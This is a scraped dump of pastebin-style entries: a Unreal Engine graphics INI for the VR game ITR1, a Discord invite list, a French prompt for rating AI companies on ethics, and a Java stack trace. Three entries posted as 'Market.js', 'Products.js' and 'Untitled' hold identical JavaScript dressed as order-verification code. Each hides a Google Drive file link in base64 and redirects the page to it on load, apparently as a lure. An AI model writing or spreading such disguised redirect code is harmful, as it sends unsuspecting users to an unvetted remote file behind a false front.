	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

authorize() - cannot load data HttpException {""code"":404,""message"":"""",""detailMessage"":""HTTP 404 "",""stackTrace"":[]}"
f9kj9Uhn,Market.js,kammex,JavaScript,Monday 21st of April 2025 05:25:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69804/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
18pQ1nu0,SNB's ITR1 optimized graphics ini file.,SuperNoob8272,INI file,Monday 21st of April 2025 05:17:34 AM CDT,"[ViewDistance]
[Low]
ViewDistance=r.ViewDistanceScale 0.6
[Medium]
ViewDistance=r.ViewDistanceScale 0.8
[High]
ViewDistance=r.ViewDistanceScale 1

[ShadowQuality]
[Low]
ShadowQuality=sg.ShadowQuality 0
ShadowQuality2=r.Shadow.CSM.MaxCascades 0
ShadowQuality3=r.Shadow.DistanceScale 0
ShadowQuality4=r.DistanceFieldShadowing 0
ShadowQuality5=r.Shadow.CSM.TransitionScale 0
ShadowQuality6=grass.DisableDynamicShadows 1
ShadowQuality7=r.ForceLODShadow 0
ShadowQuality8=r.ShadowQuality 0
ShadowQuality9=r.Shadow.RadiusThreshold 0
ShadowQuality10=r.AOQuality 0
ShadowQuality11=r.Atmosphere 0

[Medium]
ShadowQuality=sg.ShadowQuality 0
ShadowQuality2=r.Shadow.CSM.MaxCascades 0
ShadowQuality3=r.Shadow.DistanceScale 0
ShadowQuality4=r.DistanceFieldShadowing 0
ShadowQuality5=r.Shadow.CSM.TransitionScale 0
ShadowQuality6=grass.DisableDynamicShadows 1
ShadowQuality7=r.ForceLODShadow 0
ShadowQuality8=r.ShadowQuality 0
ShadowQuality9=r.Shadow.RadiusThreshold 0
ShadowQuality10=r.AOQuality 0
ShadowQuality11=r.Atmosphere 0

[High]
ShadowQuality=sg.ShadowQuality 0
ShadowQuality2=r.Shadow.CSM.MaxCascades 0
ShadowQuality3=r.Shadow.DistanceScale 0
ShadowQuality4=r.DistanceFieldShadowing 0
ShadowQuality5=r.Shadow.CSM.TransitionScale 0
ShadowQuality6=grass.DisableDynamicShadows 1
ShadowQuality7=r.ForceLODShadow 0
ShadowQuality8=r.ShadowQuality 0
ShadowQuality9=r.Shadow.RadiusThreshold 0
ShadowQuality10=r.AOQuality 0
ShadowQuality11=r.Atmosphere 0

[FoliageDensity]
[Low]
FoliageDensity=foliage.DensityScale 0
FoliageDensity1=grass.CullDistanceScale 0
[Medium]
FoliageDensity=foliage.DensityScale 0
FoliageDensity1=grass.CullDistanceScale 0
[High]
FoliageDensity=foliage.DensityScale 0
FoliageDensity1=grass.CullDistanceScale 0

[Effects]
[Low]
Effects=sg.EffectsQuality 0
Effects1=r.DetailMode 0
Effects3=sg.PostProcessQuality 0
Effects4=r.PostProcessAAQuality 6
Effects5=r.VolumetricFog.GridPixelSize 1028
Effects6=r.RefractionQuality 0
Effects7=r.SSR.Quality 0
Effects8=r.MaterialQualityLevel 0

[Medium]
Effects=sg.EffectsQuality 0
Effects1=r.DetailMode 0
Effects3=sg.PostProcessQuality 0
Effects4=r.PostProcessAAQuality 6
Effects5=r.VolumetricFog.GridPixelSize 1028
Effects6=r.RefractionQuality 0
Effects7=r.SSR.Quality 0
Effects8=r.MaterialQualityLevel 0

[High]
Effects=sg.EffectsQuality 0
Effects1=r.DetailMode 0
Effects3=sg.PostProcessQuality 0
Effects4=r.PostProcessAAQuality 6
Effects5=r.VolumetricFog.GridPixelSize 1028
Effects6=r.RefractionQuality 0
Effects7=r.SSR.Quality 0
Effects8=r.MaterialQualityLevel 0

[Textures]
[Low]
Textures=sg.TextureQuality 0
Textures1=r.MaxAnisotropy 2
[Medium]
Textures=sg.TextureQuality 1
Textures1=r.MaxAnisotropy 2
[High]
Textures=sg.TextureQuality 2
Textures1=r.MaxAnisotropy 2

[Geometry]
[Low]
Geometry=r.SkeletalMeshLODBias 0
Geometry2=r.SkeletalMeshLODRadiusScale 0.8
Geometry6=foliage.LODDistanceScale 0.1
Geometry7=r.StaticMeshLODDistanceScale 0.3

[Medium]
Geometry=r.SkeletalMeshLODBias -0.3
Geometry2=r.SkeletalMeshLODRadiusScale 0.9
Geometry6=foliage.LODDistanceScale 0.1
Geometry7=r.StaticMeshLODDistanceScale 0

[High]
Geometry=r.SkeletalMeshLODBias -0.5
Geometry2=r.SkeletalMeshLODRadiusScale 1
Geometry6=foliage.LODDistanceScale 0.1
Geometry7=r.StaticMeshLODDistanceScale -0.3

[Experimental]
[On]
Experimental=CM.r.TemporalAA.UseCMVersion 1
Experimental1=CM.r.Tonemapper.UseCMVersion 1
Experimental2=
Experimental3=
[Off]
Experimental=CM.r.TemporalAA.UseCMVersion 0
Experimental1=CM.r.Tonemapper.UseCMVersion 0
Experimental2=
Experimental3=

[taau]
taau1=r.ScreenPercentage 100
taau2=r.MipMapLODBias 0
taau3=r.NGX.DLSS.Enable 0
taau4=r.BasePassForceOutputsVelocity 0
taau5=r.FidelityFX.FSR.Enabled 0
taau6=r.TemporalAA.Upsampling 1
taau7=r.TemporalAA.Upscaler 1
taau8=r.Downsample.Quality 0

[fsr_Base]
fsr_Base1=r.NGX.DLSS.Enable 0
fsr_Base2=r.ToneMapper.Sharpen 1
fsr_Base3=r.BasePassForceOutputsVelocity 0
fsr_Base4=r.FidelityFX.FSR.Enabled 0
fsr_Base6=r.TemporalAA.Upsampling 0
fsr_Base7=r.TemporalAA.Upscaler 0
fsr_Base8=r.Downsample.Quality 0

[fsr_Ultra]
fsr_Ultra1=r.ScreenPercentage 100
fsr_Ultra2=r.MipMapLODBias -0.02683

[fsr_Quality]
fsr_Quality1=r.ScreenPercentage 80
fsr_Quality2=r.MipMapLODBias -0.3219

[fsr_Balanced]
fsr_Balanced1=r.ScreenPercentage 75
fsr_Balanced2=r.MipMapLODBias -0.415

[fsr_Performance]
fsr_Performance1=r.ScreenPercentage 65
fsr_Performance2=r.MipMapLODBias -0.625

[AA]
[MSAA]
AA=r.defaultfeature.antialiasing 3
[TAA]
AA=r.defaultfeature.antialiasing 2
[Off]
AA=r.defaultfeature.antialiasing 0

[SSR]
[On]
ssr=r.SSR.Quality 0
[Off]
ssr=r.SSR.Quality 0

[VRS]
[Performance]
vrs=r.FFR.VRSQuality 1
vrs2=r.FFR.OptimizeBasePass 3
vrs3=r.FFR.OptimizeShadowProjection 3
vrs4=r.FFR.OptimizeTonemap 3
vrs5=r.FFR.OptimizeTAA 3
[Balanced]
vrs=r.FFR.VRSQuality 3
vrs2=r.FFR.OptimizeBasePass 1
vrs3=r.FFR.OptimizeShadowProjection 1
vrs4=r.FFR.OptimizeTonemap 2
vrs5=r.FFR.OptimizeTAA 2
[Quality]
vrs=r.FFR.VRSQuality 4
vrs2=r.FFR.OptimizeBasePass 1
vrs3=r.FFR.OptimizeShadowProjection 1
vrs4=r.FFR.OptimizeTonemap 2
vrs5=r.FFR.OptimizeTAA 2
[Off]
vrs1=r.FFR.VRSQuality 0
vrs2=r.FFR.VRSQuality 0
vrs3=r.FFR.OptimizeBasePass 0
vrs4=r.FFR.OptimizeShadowProjection 0
vrs5=r.FFR.OptimizeTonemap 0
vrs6=r.FFR.OptimizeTAA 0

[Misc]
misc1=r.TemporalAA.Upsampling 1
misc2=r.TemporalAA.R11G11B10History 1
misc3=r.TemporalAAFilterSize 0.2
misc4=r.TemporalAACurrentFrameWeight 0.4
misc5=r.DistanceFieldAO 0
misc6=r.Tonemapper.GrainQuantization 0
misc7=r.Upscale.Quality 100
misc8=r.MotionBlurQuality 0
misc9=r.HZBOcclusion 0
misc10=r.VolumetricFog.HistoryWeight 0
misc11=r.VolumetricFog.HistoryMissSupersampleCount 1
misc12=r.Shadow.WholeSceneShadowCacheMb 2048
misc13=r.Shaders.Optimize 1
misc14=r.Shaders.FastMath 1
misc15=r.UseShaderCaching 1
misc16=r.UseShaderPredraw 1
misc17=r.UseAsyncShaderPrecompilation 1
misc18=r.ShaderPipelineCache.StartupMode 3
misc19=r.ShaderPipelineCache.Enabled 1
misc20=r.ShaderPipelineCache.ReportPSO 1
misc21=r.ShaderPipelineCache.GameFileMaskEnabled 0
misc22=r.ShaderPipelineCache.LazyLoadShadersWhenPSOCacheIsPresent 1
misc23=r.ShaderPipelineCache.BatchSize 50
misc24=r.CreateShadersOnLoad 1
misc25=D3D12.PSO.DiskCache 1
misc26=D3D12.PSO.DriverOptimizedDiskCache 1
misc27=gc.TimeBetweenPurgingPendingKillObjects 30
misc28=gc.NumRetriesBeforeForcingGC 5
misc29=gc.MinDesiredObjectsPerSubTask 20
misc30=s.ForceGCAfterLevelStreamedOut 0
misc31=s.ContinuouslyIncrementalGCWhileLevelsPendingPurge 0
misc32=r.GTSyncType 1
misc33=r.OneFrameThreadLag 1
misc34=r.D3D11.UseAllowTearing 1
misc35=r.D3D12.UseAllowTearing 1
misc36=﻿r.Streaming.HiddenPrimitiveScale 0.8
misc37=r.SSR.Quality 0
misc38=r.AmbientOcclusionLevels 0
misc39=r.Tonemapper.GrainQuantization 0
misc40=r.Streaming.FramesForFullUpdate 1
misc41=r.Tonemapper.Quality 0
misc42=r.VRS.Enable true
misc43=r.ReflectionMethod 0
misc44=r.Lumen.Reflections.SmoothBias 0
misc45=r.Lumen.TranslucencyReflections.FrontLayer.Enable 0
misc46=r.Lumen.ScreenProbeGather.DownsampleFactor 128
misc47=r.RayTracing 0
misc48=r.RayTracing.Enable 0
misc49=r.RayTracing.GlobalIllumination 0
misc50=r.RayTracing.Reflections 0
misc51=r.RayTracing.Reflections.Hybrid 0
misc52=r.RayTracing.Reflections.Shadows 0
misc53=r.RayTracing.Reflections.ScreenPercentage 0
misc54=r.RayTracing.Shadows 0
misc55=r.RayTracing.ForceAllRayTracingEffects 0
misc56=r.AmbientOcclusionMaxQuality 0
misc57=r.Tonemapper.Sharpen 2
misc58=FX.MaxCPUParticlesPerEmitter 50
misc59=FX.MaxGPUParticlesSpawnedPerFrame 1024
misc60=FX.AllowGPUParticles 1
misc61=r.HalfResReflections 1
misc62=GeometryCache.InterpolateFrames 1
misc63=GeometryCache.OffloadUpdate 1
misc64=r.FFR.OptimizeTonemap 3
misc65=r.FFR.VRSQuality 2
misc66=r.FFR.OptimizeBasePass 3
misc67=r.FFR.OptimizeShadowProjection 3
misc68=r.TemporalAASharpness 1.0
misc69=r.defaultfeature.antialiasing 3
misc70=r.temporalaasamples 2
misc71=r.PostProcessAAQuality 6
misc72=r.TemporalAA.Algorithm 1
misc73=r.AntiAliasingQuality 3
nusc74=r.SceneColorFringe.Max 0
misc75=r.DepthOfFieldQuality 0
misc76=r.SceneColorFringeQuality 0
misc77=r.MotionBlur.Max 0
misc78=r.TemporalAA.Upsampling=1
misc79=r.TemporalAA.R11G11B10History=1
misc80=r.TemporalAAFilterSize=0.2
misc81=r.TemporalAACurrentFrameWeight=0.4
misc82=r.DistanceFieldAO=0
misc83=r.Tonemapper.GrainQuantization=0
misc84=r.Upscale.Quality=100
misc85=r.MotionBlurQuality=0
misc86=r.HZBOcclusion=0
misc87=r.VolumetricFog.HistoryWeight=0
misc88=r.VolumetricFog.HistoryMissSupersampleCount=1
misc89=r.Shadow.WholeSceneShadowCacheMb=2048
misc90=r.Shaders.Optimize=1
misc91=r.Shaders.FastMath=1
misc92=r.UseShaderCaching=1
misc93=r.UseShaderPredraw=1
misc94=r.UseAsyncShaderPrecompilation=1
misc95=r.ShaderPipelineCache.StartupMode=3
misc96=r.ShaderPipelineCache.Enabled=1
misc97=r.ShaderPipelineCache.ReportPSO=1
misc98=r.ShaderPipelineCache.GameFileMaskEnabled=0
misc99=r.ShaderPipelineCache.LazyLoadShadersWhenPSOCacheIsPresent=1
misc100=r.ShaderPipelineCache.BatchSize=50
misc101=D3D12.PSO.DiskCache=1
misc102=D3D12.PSO.DriverOptimizedDiskCache=1
misc103=gc.TimeBetweenPurgingPendingKillObjects=30
misc104=gc.NumRetriesBeforeForcingGC=5
misc105=gc.MinDesiredObjectsPerSubTask=20
misc106=s.ForceGCAfterLevelStreamedOut=0
misc107=s.ContinuouslyIncrementalGCWhileLevelsPendingPurge=0
misc108=r.GTSyncType=1
misc109=r.OneFrameThreadLag=1
misc110=r.D3D11.UseAllowTearing=1
misc111=r.D3D12.UseAllowTearing=1
misc112=r.Streaming.HiddenPrimitiveScale=0.8
misc113=r.SSR.Quality=0
misc114=r.AmbientOcclusionLevels=0
misc115=r.Tonemapper.GrainQuantization=0
misc116=r.Streaming.FramesForFullUpdate=1
misc117=r.Tonemapper.Quality=0
misc118=r.VRS.Enable=true
misc119=r.ReflectionMethod=0
misc120=r.Lumen.Reflections.SmoothBias=0
misc121=r.Lumen.TranslucencyReflections.FrontLayer.Enable=0
misc122=r.Lumen.ScreenProbeGather.DownsampleFactor=128
misc123=r.RayTracing=0
misc124=r.RayTracing.Enable=0
misc125=r.RayTracing.GlobalIllumination=0
misc126=r.RayTracing.Reflections=0
misc127=r.RayTracing.Reflections.Hybrid=0
misc128=r.RayTracing.Reflections.Shadows=0
misc129=r.RayTracing.Reflections.ScreenPercentage=0
misc130=r.RayTracing.Shadows=0
misc131=r.RayTracing.ForceAllRayTracingEffects=0
misc132=r.AmbientOcclusionMaxQuality=0
misc133=r.Tonemapper.Sharpen=2
misc134=FX.MaxCPUParticlesPerEmitter=50
misc135=FX.MaxGPUParticlesSpawnedPerFrame=1024
misc136=FX.AllowGPUParticles=1
misc137=r.HalfResReflections=1
misc138=GeometryCache.InterpolateFrames=1
misc139=GeometryCache.OffloadUpdate=1
misc140=r.FFR.OptimizeTonemap=3
misc141=r.FFR.VRSQuality=2
misc142=r.FFR.OptimizeBasePass=3
misc143=r.FFR.OptimizeShadowProjection=3
misc144=r.TemporalAASharpness=1.0
misc145=r.defaultfeature.antialiasing=3
misc146=r.temporalaasamples=2
misc147=r.PostProcessAAQuality=6
misc148=r.TemporalAA.Algorithm=1
misc149=r.AntiAliasingQuality=3
misc150=r.SceneColorFringe.Max=0
misc151=r.DepthOfFieldQuality=0
misc152=r.SceneColorFringeQuality=0
misc153=r.MotionBlur.Max=0

[Common]
ScreenPercentage=90,95,100,105,110,115,120,125,130,135,140,145,150
PixelDensity=0.9,0.95,1,1.05,1.1,1.15,1.2,1.25,1.3,1.35,1.4,1.45,1.5
oculus=r.RHIThread.Enable 1
ResolutionLow=0
ResolutionMedium=1
ResolutionHigh=2
misc1=r.TemporalAA.Upsampling 1
misc2=r.TemporalAA.R11G11B10History 1
misc3=r.TemporalAAFilterSize 0.2
misc4=r.TemporalAACurrentFrameWeight 0.4
misc5=r.DistanceFieldAO 0
misc6=r.Tonemapper.GrainQuantization 0
misc7=r.Upscale.Quality 100
misc8=r.MotionBlurQuality 0
misc9=r.HZBOcclusion 0
misc10=r.VolumetricFog.HistoryWeight 0
misc11=r.VolumetricFog.HistoryMissSupersampleCount 1
misc12=r.Shadow.WholeSceneShadowCacheMb 2048
misc13=r.Shaders.Optimize 1
misc14=r.Shaders.FastMath 1
misc15=r.UseShaderCaching 1
misc16=r.UseShaderPredraw 1
misc17=r.UseAsyncShaderPrecompilation 1
misc18=r.ShaderPipelineCache.StartupMode 3
misc19=r.ShaderPipelineCache.Enabled 1
misc20=r.ShaderPipelineCache.ReportPSO 1
misc21=r.ShaderPipelineCache.GameFileMaskEnabled 0
misc22=r.ShaderPipelineCache.LazyLoadShadersWhenPSOCacheIsPresent 1
misc23=r.ShaderPipelineCache.BatchSize 50
misc24=r.CreateShadersOnLoad 1
misc25=D3D12.PSO.DiskCache 1
misc26=D3D12.PSO.DriverOptimizedDiskCache 1
misc27=gc.TimeBetweenPurgingPendingKillObjects 30
misc28=gc.NumRetriesBeforeForcingGC 5
misc29=gc.MinDesiredObjectsPerSubTask 20
misc30=s.ForceGCAfterLevelStreamedOut 0
misc31=s.ContinuouslyIncrementalGCWhileLevelsPendingPurge 0
misc32=r.GTSyncType 1
misc33=r.OneFrameThreadLag 1
misc34=r.D3D11.UseAllowTearing 1
misc35=r.D3D12.UseAllowTearing 1
misc36=﻿r.Streaming.HiddenPrimitiveScale 0.8
misc37=r.SSR.Quality 0
misc38=r.AmbientOcclusionLevels 0
misc39=r.Tonemapper.GrainQuantization 0
misc40=r.Streaming.FramesForFullUpdate 1
misc41=r.Tonemapper.Quality 0
misc42=r.VRS.Enable true
misc43=r.ReflectionMethod 0
misc44=r.Lumen.Reflections.SmoothBias 0
misc45=r.Lumen.TranslucencyReflections.FrontLayer.Enable 0
misc46=r.Lumen.ScreenProbeGather.DownsampleFactor 128
misc47=r.RayTracing 0
misc48=r.RayTracing.Enable 0
misc49=r.RayTracing.GlobalIllumination 0
misc50=r.RayTracing.Reflections 0
misc51=r.RayTracing.Reflections.Hybrid 0
misc52=r.RayTracing.Reflections.Shadows 0
misc53=r.RayTracing.Reflections.ScreenPercentage 0
misc54=r.RayTracing.Shadows 0
misc55=r.RayTracing.ForceAllRayTracingEffects 0
misc56=r.AmbientOcclusionMaxQuality 0
misc57=r.Tonemapper.Sharpen 2
misc58=FX.MaxCPUParticlesPerEmitter 50
misc59=FX.MaxGPUParticlesSpawnedPerFrame 1024
misc60=FX.AllowGPUParticles 1
misc61=r.HalfResReflections 1
misc62=GeometryCache.InterpolateFrames 1
misc63=GeometryCache.OffloadUpdate 1
misc64=r.FFR.OptimizeTonemap 3
misc65=r.FFR.VRSQuality 2
misc66=r.FFR.OptimizeBasePass 3
misc67=r.FFR.OptimizeShadowProjection 3
misc68=r.TemporalAASharpness 1.0
misc69=r.defaultfeature.antialiasing 3
misc70=r.temporalaasamples 2
misc71=r.PostProcessAAQuality 6
misc72=r.TemporalAA.Algorithm 1
misc73=r.AntiAliasingQuality 3
nusc74=r.SceneColorFringe.Max 0
misc75=r.DepthOfFieldQuality 0
misc76=r.SceneColorFringeQuality 0
misc77=r.MotionBlur.Max 0
misc78=r.TemporalAA.Upsampling=1
misc79=r.TemporalAA.R11G11B10History=1
misc80=r.TemporalAAFilterSize=0.2
misc81=r.TemporalAACurrentFrameWeight=0.4
misc82=r.DistanceFieldAO=0
misc83=r.Tonemapper.GrainQuantization=0
misc84=r.Upscale.Quality=100
misc85=r.MotionBlurQuality=0
misc86=r.HZBOcclusion=0
misc87=r.VolumetricFog.HistoryWeight=0
misc88=r.VolumetricFog.HistoryMissSupersampleCount=1
misc89=r.Shadow.WholeSceneShadowCacheMb=2048
misc90=r.Shaders.Optimize=1
misc91=r.Shaders.FastMath=1
misc92=r.UseShaderCaching=1
misc93=r.UseShaderPredraw=1
misc94=r.UseAsyncShaderPrecompilation=1
misc95=r.ShaderPipelineCache.StartupMode=3
misc96=r.ShaderPipelineCache.Enabled=1
misc97=r.ShaderPipelineCache.ReportPSO=1
misc98=r.ShaderPipelineCache.GameFileMaskEnabled=0
misc99=r.ShaderPipelineCache.LazyLoadShadersWhenPSOCacheIsPresent=1
misc100=r.ShaderPipelineCache.BatchSize=50
misc101=D3D12.PSO.DiskCache=1
misc102=D3D12.PSO.DriverOptimizedDiskCache=1
misc103=gc.TimeBetweenPurgingPendingKillObjects=30
misc104=gc.NumRetriesBeforeForcingGC=5
misc105=gc.MinDesiredObjectsPerSubTask=20
misc106=s.ForceGCAfterLevelStreamedOut=0
misc107=s.ContinuouslyIncrementalGCWhileLevelsPendingPurge=0
misc108=r.GTSyncType=1
misc109=r.OneFrameThreadLag=1
misc110=r.D3D11.UseAllowTearing=1
misc111=r.D3D12.UseAllowTearing=1
misc112=r.Streaming.HiddenPrimitiveScale=0.8
misc113=r.SSR.Quality=0
misc114=r.AmbientOcclusionLevels=0
misc115=r.Tonemapper.GrainQuantization=0
misc116=r.Streaming.FramesForFullUpdate=1
misc117=r.Tonemapper.Quality=0
misc118=r.VRS.Enable=true
misc119=r.ReflectionMethod=0
misc120=r.Lumen.Reflections.SmoothBias=0
misc121=r.Lumen.TranslucencyReflections.FrontLayer.Enable=0
misc122=r.Lumen.ScreenProbeGather.DownsampleFactor=128
misc123=r.RayTracing=0
misc124=r.RayTracing.Enable=0
misc125=r.RayTracing.GlobalIllumination=0
misc126=r.RayTracing.Reflections=0
misc127=r.RayTracing.Reflections.Hybrid=0
misc128=r.RayTracing.Reflections.Shadows=0
misc129=r.RayTracing.Reflections.ScreenPercentage=0
misc130=r.RayTracing.Shadows=0
misc131=r.RayTracing.ForceAllRayTracingEffects=0
misc132=r.AmbientOcclusionMaxQuality=0
misc133=r.Tonemapper.Sharpen=2
misc134=FX.MaxCPUParticlesPerEmitter=50
misc135=FX.MaxGPUParticlesSpawnedPerFrame=1024
misc136=FX.AllowGPUParticles=1
misc137=r.HalfResReflections=1
misc138=GeometryCache.InterpolateFrames=1
misc139=GeometryCache.OffloadUpdate=1
misc140=r.FFR.OptimizeTonemap=3
misc141=r.FFR.VRSQuality=2
misc142=r.FFR.OptimizeBasePass=3
misc143=r.FFR.OptimizeShadowProjection=3
misc144=r.TemporalAASharpness=1.0
misc145=r.defaultfeature.antialiasing=3
misc146=r.temporalaasamples=2
misc147=r.PostProcessAAQuality=6
misc148=r.TemporalAA.Algorithm=1
misc149=r.AntiAliasingQuality=3
misc150=r.SceneColorFringe.Max=0
misc151=r.DepthOfFieldQuality=0
misc152=r.SceneColorFringeQuality=0
misc153=r.MotionBlur.Max=0

; custom ini made by SNB. 
; this is a combination of my ITR1 and ITR2 optimized ini files, making something that sounds cursed but it genuinely has given the best performance I have ever seen on ITR1.
; the duplicate lines are on purpose, it is to make sure unreal engine doesnt pull some jank and not apply the settings. I still do not trust unreal enough after having worked on modding it for such a long time.
; this is the ini file I use to livestream the game on Twitch during my challenge runs such as 2x Stalker.
; v my specs v
; GPU : GTX 1650S
; CPU : Ryzen 5 3600 6-core
; RAM : 16GB 
; VRAM : 4GB
; Headset : Quest 2 via USB C-C link cable.
; Capped 72 fps to avoid power throttling to have longer sessions + personal preference.
; Average battery lifetime in VR while streaming ITR : 6-8 hrs."
CazgPgtc,Untitled,kammex,JavaScript,Monday 21st of April 2025 05:10:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84072/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LR5FAAa0,Discord Tag Invites,artiri_art,JSON,Monday 21st of April 2025 04:55:33 AM CDT,"{
    ""iOS"": ""jb"",
    ""EMH"": ""PnJduygy7J"",
    ""cute"": ""tibo"",
    ""OWO"": ""pupy"",
    ""SOUL"": ""xFrgMAzmUc"",
    ""MEOW"": ""shaun"",
    ""BRUH"": ""FsT8UsBa"",
    ""VALC"": ""valcraft"",
    ""VIP"": ""Sft8Wjwx"",
    ""puff"": ""kimjiwoo"",
    ""DSLC"": ""dislace"",
    ""loco"": ""Hg9PQYZe"",
    ""RAWR"": ""kCh734XdZv"",
    ""fpi"": ""fpi"",
    ""GCA"": ""Bwx6cdAmZM"",
    ""moco"": ""moco"",
    ""WTDS"": ""wtuds"",
    ""STAR"": ""Cc7K4Gdj"",
    ""EZ"": ""ySQRw7EcKb"",
    ""CYBR"": ""cyberinfo"",
    ""DEV"": ""reactionroles"",
    ""TIT"": ""titsrp"",
    ""LGBT"": ""lgbtqia"",
    ""COLB"": ""colbe"",
    ""DUAL"": ""dualview""
}
"
nDX1EZD5,Products.js,dentira,JavaScript,Monday 21st of April 2025 04:54:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68656/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mPNuQmnv,Prompt Moralscorisation entreprises - AI,rafigaro,JSON,Monday 21st of April 2025 04:42:00 AM CDT,"""""""
        Voici une entreprise ou une marque à analyser :  
        **[ENTREPRISE]**  et son **Site web** : 
        ""ENTREPRISE"": XXXX, XXXX
 
        **Secteur** : Intelligence Artificielle Générative
 
        Tu es analyste RSE pour **Moralscore**, un site d’évaluation éthique des entreprises. Sensible aux enjeux environnementaux et sociétaux, tu évalues l’activité de cette entreprise dans le secteur mentionné, en identifiant notamment leur impact écologique, sociétal, social, politique, les polémiques, scandales, conflits, compromissions et la moralité des dirigeants. Tu as un rôle critique, tu prêtes attention à toutes les controverses et les polémiques qui entourent les entreprises sans complaisance.
 
        ### 1. Recherche d’infos de base  
        Cherche les informations suivantes :  
        - [Pays d’origine] (code ISO 3166-1 à 2 lettres)  
        - [Date de création]  
        - [Groupe, Actionnaire]  
        - [Nb de Salariés]  
        - [Nb de GPU]  
		- [Capitaux levés] (en M€/$, au format ##.#)
        - [Dernier C.A connu] (en M€/$, au format ##.#)  
        - [Dernier résultat connu] (en M€/$, au format ##.#)  

 
        Répond de manière concise (3 à 4 mots max). Si une information est introuvable, indique simplement `""""`.
 
        ---
        ### 2. Analyse éthique selon les critères Moralscore
 
        Pour chaque critère ci-dessous (code critère entre ** ** ex. COMP, INNO), effectue une recherche approfondie sur l’entreprise, élargie au groupe auquel elle appartient, son actionnaire principal et ses dirigeants.
        - **N’invente jamais de sources.**  
        - Si aucune info n’est disponible, indique-le de manière neutre :  
        ""pas d’info publique"", ""nous n’avons pas trouvé…"", ""Moralscore n’a pas trouvé…"", etc.  
        - Privilégie **les sources indépendantes** (notamment critiques) et celles qui proviennent des **ONG**.
        - Les informations communiquées par l’entreprise elle même ou son actionnaire doivent être **présentées au conditionnel** et considérées comme **moins fiables**, et doit se **refléter par une moins bonne note**.
 
        #### Critères à évaluer :  
        - **COMP** : Respect des lois, fiscalité (évasion/optimisation), biais politiques, distorsion des informations, contribution sociétale (emplois, mécénat), dégats éventuels provoqués moralité, comportement et positions politiques des dirigeants. Modèle propriétaire ou open source (open source est plus favorable). 
        - **INNO** : Innovation par rapport aux autres acteurs du secteur, ce qui les distingue. Tenue de leur promesses et des performances annoncées et de leur feuille de route.
        - **COMM** : Impact écologique de leurs modèles, coût écologique de la puissance de calcul, des data centers, énergie utilisée.  
        - **CORP** : Rentabilité, gouvernance, sommes levées auprès des investisseurs et retour pour les investisseurs. Gouvernance de l'entreprise et structure. Transparence du fonctionnement.  
        - **JUST** : Conditions de travail, juste rémunération, respect droit du travail, diversité et inclusion, grèves, conflits internes, discriminations, revendication des collaborateurs. Emploi de main d'œuvre sous payée dans les pays pauvres pour valider les données. 
        - **TECH** : Substitution des travailleurs par IA/robots. Impact sur l'emploi en général.  
        - **EQUI** : Relations équitables avec les propriétaires des contenus qui sont aspirées par les modèles, juste rémunération du droit d'auteur des auteurs, journalistes et artistes.   
        - **PRIV** : respect des données personnelles de l'utilisateur, protection de ses données personnelles, exploitation des données dans ses modèles, vente à des tiers, conformité RGPD, droits des clients, protection et recours.
        - **PRCE** : Niveau de prix, accessibilité, rapport qualité/prix, coûts cachés, ventes forcées.  
        - **QOS** : Qualité du modèle par rapport à ses concurrents et selon les benchmarks, points forts et point faibles. Niveau d'hallucination. Génération de contenus controversés.
 
